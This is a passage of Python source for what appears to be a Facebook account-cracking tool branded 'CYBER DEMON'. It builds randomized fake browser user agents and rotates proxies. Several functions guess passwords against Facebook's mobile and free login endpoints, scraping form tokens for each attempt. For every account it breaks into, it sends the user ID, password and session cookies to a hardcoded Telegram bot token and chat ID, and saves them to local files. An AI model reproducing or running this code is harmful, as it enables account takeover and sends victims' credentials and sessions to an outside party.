	i14=f"Mozilla/5.0 (iPad; CPU OS {str(rr(4,16))}_{str(rr(0,15))} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 CriOS/{str(rr(73,110))}.0.{str(rr(2000,6000))}.{str(rr(1,230))} YaBrowser/22.9.1.590.11 Mobile/15E148 Safari/604.1"
	i15=f"Mozilla/5.0 (Macintosh; Intel Mac OS X {str(rr(4,16))}_{str(rr(0,9))}_{str(rr(0,9))}) AppleWebKit/608.2.11 (KHTML, like Gecko) Version/13.1.2 Safari/608.2.11"
	i16=f"Mozilla/5.0 (iPod; U; CPU iPhone OS {str(rr(4,16))}_{str(rr(0,15))} like Mac OS X; vi-VN) AppleWebKit/532.9.1 (KHTML, like Gecko) Version/4.0.5 Mobile/8B116 Safari/6532.9.1"
	i17=f"Mozilla/5.0 (iPhone; CPU iPhone OS {str(rr(4,16))}_{str(rr(0,15))} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/605.1 NAVER(inapp; search; 1010; 11.15.0; SE2)"
	i18=f"Mozilla/5.0 (iPhone; CPU iPhone OS {str(rr(4,16))}_{str(rr(0,9))}_{str(rr(0,9))} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) team+ Pro/12.2.0.2 iOS; iPhone 8 Plus; Build Version/15.6.1 (Build 19G82) CFNetwork/1335.0.3 Darwin/21.6.0"
	i19=f"Mozilla/5.0 (iPhone; CPU iPhone OS {str(rr(4,16))}_{str(rr(0,9))}_{str(rr(0,9))} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1 Edg/{str(rr(73,110))}.0.{str(rr(2000,6000))}.{str(rr(1,230))}"
	i20=f"Mozilla/5.0 (Macintosh; Intel Mac OS X {str(rr(4,16))}_{str(rr(0,9))}_{str(rr(0,9))}) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Safari/605.1.15 OPX/1.6.1"
	i21=f"Mozilla/5.0 (X11; Linux x86_64; Cosmos Build/PTO9.211212.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,110))}.0.{str(rr(2000,6000))}.{str(rr(10,230))} Safari/537.36 Quick Search TV/Little Sun Edition 105.36"
	i7=f"MobileSafari/8613.4.1.0.2 CFNetwork/1335.0.3 Darwin/21.6.0"
	ua3=random.choice([i1,i2,i3,i4,i5,i6,i7,i8,i9,i10,i11,i12,i13,i14,i15,i16,i17,i18,i19,i20,i21])
	return ua3


def firefox():
	rr = random.randint
	rc = random.choice
	c = rr(73,110)
	b = random.choice([str(random.randint(4,7))+'.'+str(random.randint(0,9))+'.'+str(random.randint(0,9)),'8.0.0','8','9','10','11','12','13'])
	d = rr(0,10)
	f1=f"Mozilla/5.0 (Windows NT {str(rr(0,10))}.{str(rr(0,10))}; Win64; x64; rv:{c}.{d}) Gecko/{str(rr(180000,220000))} Firefox/{c}.{d}"
	f2=f"Mozilla/5.0 (Android {str(rc(b))}; Mobile; rv:{c}.{d}) Gecko/{c}.{d} Firefox/{c}.{d}"
	f3=f"Mozilla/5.0 (Macintosh; Intel Mac OS X {str(rr(4,16))}_{str(rr(0,15))}; rv:{c}.{d}) Gecko/{str(rr(180000,220000))} Firefox/{c}.{d}"
	f4=f"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:{c}.{d}) Gecko/{str(rr(180000,220000))} Firefox/{c}.{d}"
	f5=f"Mozilla/5.0 (Windows NT 6.1; rv:{str(rr(0,100))}.{str(rr(0,10))}) Gecko/20100101 Firefox/{str(rr(0,100))}.{str(rr(0,10))}"
	ua4=random.choice([f1,f2,f3,f4])
	return ua4


#--------------------[ METODE MOBILE ]-----------------#
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = useragent()
	uno = open('..txt','r').read().splitlines()
	#ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"{k}DEMON{x} {loop}/{len(id)} OK-:[bold green]{ok}")
	prog.advance(des) 
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'm.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','facebook-api-version': 'v12.0','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-request-id': 'A3PUDZnzy2xgkMAkH9bcVof','x-fb-trace-id': 'Cx4jrkJJire','x-fb-rev': '1007127514','x-fb-debug': 'AXRLN2ab6tbNBxFWS6kiERe8mEyeHkpYgc1xM77joSCak8hY1B2+tWfeptUXVmRpMqno2j95r13+cw0bLoOi4A==','content-length': '2141','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=345000986033587&auth_token=fc3a739419a39bebc2d6667c045da0cd&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&refsrc=deprecated&app_id=345000986033587&cancel=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&lwv=100',data=data,headers=headers,allow_redirects=False)
			if "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree= Tree(f"[[b green]+[white]] OK ACCOUNT ",guide_style="bold grey100")
				tree.add(f"[b green]{Jawnx(idf)}")
				tree.add(f"\r[bold green]{idf} | {pw}").add(f"\r[bold green ]{kuki} ")
				cetak(tree)
				requests.post(f"https://api.telegram.org/bot5801819480:AAGPf7_L3g-aCBMswPmWnRVZqpRgCth-ssY/sendMessage?chat_id=1977098006&text= OK RESULT \n( {uno} )\n ====================\n ( {Jawnx(idf)} )\n.√. USER   (  {idf}  )\n.√. PASSWORD  (  {pw}  )\n ====================\n.√. USERAGENT   (  {ua}  )\n.√. .√. COOKIE   (  {kuki}  )\n.√. By :- CYBER DEMON √ " )
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
	
	
	
#--------------------[ METODE MOBILE V2 ]-----------------#
def crackmobilev2(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = useragentt()
	#ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"{k}DEMON{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D113289095462482%26scope%3Demail%252Cpublic_profile%26redirect_uri%3Dhttps%253A%252F%252Fzoom.us%252Ffacebook%252Foauth%26state%3DR0dyYTRzQmhUUzJ4Zk9Xc1pFd3NOdyxmYWNlYm9va19zaWduaW4%26_x_zm_rtaid%3DcVJiy3uGSbSvWr-DDSZNng.1679058723947.4bc348f596f10457902323ef31509d67%26_x_zm_rhtaid%3D542%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D516d7f95-093f-4513-847e-788f90c4cbd5%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fzoom.us%2Ffacebook%2Foauth%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DR0dyYTRzQmhUUzJ4Zk9Xc1pFd3NOdyxmYWNlYm9va19zaWduaW4%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/login.php?skip_api_login=1&api_key=113289095462482&kid_directed_site=0&app_id=113289095462482&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D113289095462482%26scope%3Demail%252Cpublic_profile%26redirect_uri%3Dhttps%253A%252F%252Fzoom.us%252Ffacebook%252Foauth%26state%3DR0dyYTRzQmhUUzJ4Zk9Xc1pFd3NOdyxmYWNlYm9va19zaWduaW4%26_x_zm_rtaid%3DcVJiy3uGSbSvWr-DDSZNng.1679058723947.4bc348f596f10457902323ef31509d67%26_x_zm_rhtaid%3D542%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D516d7f95-093f-4513-847e-788f90c4cbd5%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fzoom.us%2Ffacebook%2Foauth%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DR0dyYTRzQmhUUzJ4Zk9Xc1pFd3NOdyxmYWNlYm9va19zaWduaW4%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D113289095462482%26scope%3Demail%252Cpublic_profile%26redirect_uri%3Dhttps%253A%252F%252Fzoom.us%252Ffacebook%252Foauth%26state%3DR0dyYTRzQmhUUzJ4Zk9Xc1pFd3NOdyxmYWNlYm9va19zaWduaW4%26_x_zm_rtaid%3DcVJiy3uGSbSvWr-DDSZNng.1679058723947.4bc348f596f10457902323ef31509d67%26_x_zm_rhtaid%3D542%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D516d7f95-093f-4513-847e-788f90c4cbd5%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fzoom.us%2Ffacebook%2Foauth%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DR0dyYTRzQmhUUzJ4Zk9Xc1pFd3NOdyxmYWNlYm9va19zaWduaW4%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree= Tree(f"[[b red]+[white]] CP ACCOUNT ",guide_style="bold grey100")
				tree.add(f"[b yellow]{Jawnx(idf)}")
				tree.add(f"[[b red]+[white]][bold yellow]{idf} | {pw}")
				tree.add(f"[[b red]+[white]][bold blue]{ua}")
				cetak(tree)
				pen('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				requests.post(f"https://api.telegram.org/bot5801819480:AAGPf7_L3g-aCBMswPmWnRVZqpRgCth-ssY/sendMessage?chat_id=1977098006&text= CP RESULT \n( {uno} )\n ====================\n ( {Jawnx(idf)} ) /n.√. USER   (  {idf}  )\n.√. PASSWORD  (  {pw}  )\n ====================\n.√. USERAGENT   (  {ua}  )\n.√. By :- CYBER DEMON √ " )
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree= Tree(f"[[b green]+[white]] OK ACCOUNT ",guide_style="bold grey100")
				tree.add(f"[b green]{Jawnx(idf)}")
				tree.add(f"\r[bold green]{idf} | {pw}").add(f"\r[bold green ]{kuki} ")
				cetak(tree)
				requests.post(f"https://api.telegram.org/bot5801819480:AAGPf7_L3g-aCBMswPmWnRVZqpRgCth-ssY/sendMessage?chat_id=1977098006&text= OK RESULT \n( {uno} )\n ====================\n ( {Jawnx(idf)} )\n.√. USER   (  {idf}  )\n.√. PASSWORD  (  {pw}  )\n ====================\n.√. USERAGENT   (  {ua}  )\n.√. .√. COOKIE   (  {kuki}  )\n.√. By :- CYBER DEMON √ " )
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
#------------------[ METHODE MBASIC ]-------------------#
def crackmbasic(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = iphone()
	#ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"{k} DEMON {x} {loop}/{len(id)} OK-:[bold green]{ok}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=950160105669643&kid_directed_site=0&app_id=950160105669643&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D950160105669643%26scope%3Dpublic_profile%2Bemail%26state%3DeyJjc3JmX3Rva2VuIjoiODZiZjM4MzFjMWE4NWYwNzhmZGUyZWY2ZDk4ZWNiMGUifQ%25253D%25253D%26redirect_uri%3Dhttps%253A%252F%252Fwww.nassfeld.at%252Fauth%252Foauth%252Fcheck%252Ffacebook%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Da3c9e2da-62f8-4d27-8613-adbf1a26e11c%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.nassfeld.at%2Fauth%2Foauth%2Fcheck%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DeyJjc3JmX3Rva2VuIjoiODZiZjM4MzFjMWE4NWYwNzhmZGUyZWY2ZDk4ZWNiMGUifQ%25253D%25253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': re.search('name="try_number" value="(.*?)"',str(link.text)).group(1),
'unrecognized_tries': re.search('name="unrecognized_tries" value="(.*?)"',str(link.text)).group(1),
'email': idf,
'prefill_contact_point': idf,
'prefill_source': 'browser_onload',
'prefill_type': 'contact_point',
'first_prefill_source': 'browser_dropdown',
'first_prefill_type': 'contact_point',
'had_cp_prefilled': 'true',
'had_password_prefilled': 'false',
'is_smart_lock': 'false',
'bi_xrwh': '0',
'encpass': '#PWD_BROWSER:0:{}:{}'.format(re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),pw),
'fb_dtsg': '',
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'__dyn': '0wGaAG1mwHwh8-t0BBBg9oqxK12wAxu13w9y1DxW0Oohw5ux60Vo1a852q1ew65wce09MKdw5Owk888C0l-q3q0ny1Awci1qw8W0iW220jG3qaw4kwbS1Lw9C0z82fw',
'__csr': '',
'__req': random.choice('abcdefghijklmnopqrstuvwxyz123456789'),
'__a': '',
'__user':0
}
			headers = {'Host': 'm.facebook.com','content-length': '2146','sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"','sec-ch-ua-mobile': '?1','user-agent':ua,'content-type': 'application/x-www-form-urlencoded','x-fb-lsd': 'AVqI9RPLQs0','x-asbd-id': '198387','save-data': 'on','sec-ch-ua-platform': '"Android"','accept': '*/*','origin': 'https://m.facebook.com','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=950160105669643&kid_directed_site=0&app_id=950160105669643&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D950160105669643%26scope%3Dpublic_profile%2Bemail%26state%3DeyJjc3JmX3Rva2VuIjoiODZiZjM4MzFjMWE4NWYwNzhmZGUyZWY2ZDk4ZWNiMGUifQ%25253D%25253D%26redirect_uri%3Dhttps%253A%252F%252Fwww.nassfeld.at%252Fauth%252Foauth%252Fcheck%252Ffacebook%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Da3c9e2da-62f8-4d27-8613-adbf1a26e11c%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.nassfeld.at%2Fauth%2Foauth%2Fcheck%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DeyJjc3JmX3Rva2VuIjoiODZiZjM4MzFjMWE4NWYwNzhmZGUyZWY2ZDk4ZWNiMGUifQ%25253D%25253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://m.facebook.com/login/device-based/login/async/?api_key=950160105669643&auth_token=ac271a0b69b219581ad260574e470ce4&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D950160105669643%26scope%3Dpublic_profile%2Bemail%26state%3DeyJjc3JmX3Rva2VuIjoiODZiZjM4MzFjMWE4NWYwNzhmZGUyZWY2ZDk4ZWNiMGUifQ%25253D%25253D%26redirect_uri%3Dhttps%253A%252F%252Fwww.nassfeld.at%252Fauth%252Foauth%252Fcheck%252Ffacebook%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Da3c9e2da-62f8-4d27-8613-adbf1a26e11c%26tp%3Dunspecified&refsrc=deprecated&app_id=950160105669643&cancel=https%3A%2F%2Fwww.nassfeld.at%2Fauth%2Foauth%2Fcheck%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DeyJjc3JmX3Rva2VuIjoiODZiZjM4MzFjMWE4NWYwNzhmZGUyZWY2ZDk4ZWNiMGUifQ%25253D%25253D%23_%3D_&lwv=100',data=data,headers=headers)
			if "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree= Tree(f"[[b green]+[white]] OK ACCOUNT ",guide_style="bold grey100")
				tree.add(f"[b green]{Jawnx(idf)}")
				tree.add(f"\r[bold green]{idf} | {pw}").add(f"\r[bold green ]{kuki} ")
				cetak(tree)
				requests.post(f"https://api.telegram.org/bot5801819480:AAGPf7_L3g-aCBMswPmWnRVZqpRgCth-ssY/sendMessage?chat_id=1977098006&text= OK RESULT \n( {uno} )\n ====================\n ( {Jawnx(idf)} )\n.√. USER   (  {idf}  )\n.√. PASSWORD  (  {pw}  )\n ====================\n.√. USERAGENT   (  {ua}  )\n.√. .√. COOKIE   (  {kuki}  )\n.√. By :- CYBER DEMON √ " )
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
	
	
	
	
#------------------[ METHODE FREE]-------------------#
def crackfree(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = firefox()
	#ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"{k}DEMON{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			link = ses.get('https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'free.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','facebook-api-version': 'v12.0','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-request-id': 'A3PUDZnzy2xgkMAkH9bcVof','x-fb-trace-id': 'Cx4jrkJJire','x-fb-rev': '1007127514','x-fb-debug': 'yW2guQRJM3jnGatG5yBvokfcLBkNHf9n2TcoDukeOmMfVSQ2JjqH9nh8kfJmiz+n3M1iN4Le5FFdFEGSAsdQpA==','content-length': '166','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://free.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://free.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8','accept-encoding': 'gzip, deflate,br','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://free.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&ref=dbl',data=data,headers=headers,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree= Tree(f"[[b red]+[white]] CP ACCOUNT ",guide_style="bold grey100")
